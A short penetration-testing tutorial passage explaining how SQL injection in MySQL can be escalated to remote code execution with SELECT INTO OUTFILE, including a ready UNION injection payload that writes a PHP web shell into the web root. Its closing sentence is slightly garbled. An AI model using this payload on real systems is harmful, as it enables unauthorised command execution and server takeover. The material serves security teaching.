

Although the various MySQL database variants don't offer a single function to escalate to RCE, we can abuse the `SELECT INTO_OUTFILE` statement to write files on the web server.

For this attack to work, the file location must be writable to the OS user running the database software.

This command will write a php web shell to the web root/tmp folder:

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

we may receive a type error which will now effect our writing of the file.